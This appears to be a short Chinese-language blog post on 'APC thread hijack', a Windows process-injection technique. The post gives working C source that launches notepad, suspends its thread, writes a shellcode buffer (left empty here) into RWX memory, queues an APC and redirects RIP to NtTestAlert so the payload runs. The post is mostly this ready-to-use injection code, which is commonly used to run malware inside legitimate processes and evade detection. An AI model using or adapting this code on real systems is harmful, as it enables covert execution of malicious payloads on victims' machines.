# APC Thread Hijack

## 简介

我也不知道为什么要写这个....这玩意有点像脱裤子放屁....

昨天和某个dalao谈论了一下apc注入，我们经过友好的技术♂交流\(迫真\)，意识到了三环插入的apc无法确定时间执行，于是有了这个东西。

能弹出窗来就是了。

## 流程

1. 插入apc
2. 挂起线程
3. 修改rip指向NtTestAlert函数
4. 恢复线程

## 代码

```text
#include<Windows.h>
#include<stdio.h>

char shellcode[] =
"";

typedef VOID(NTAPI* pNtTestAlert)(VOID);

int main() {
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	Sleep(1000);//Wait for thread initialization to complete -> nttestalert is executed
	SuspendThread(pi.hThread);
	LPVOID lpBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);
	CONTEXT ctx = { 0 };
	QueueUserAPC((PAPCFUNC)lpBuffer, pi.hThread, NULL);
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &ctx);
	ctx.Rip = (DWORD64)NtTestAlert;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	//NtTestAlert();
	return 0;
}
```

![](../.gitbook/assets/image%20%28144%29.png)

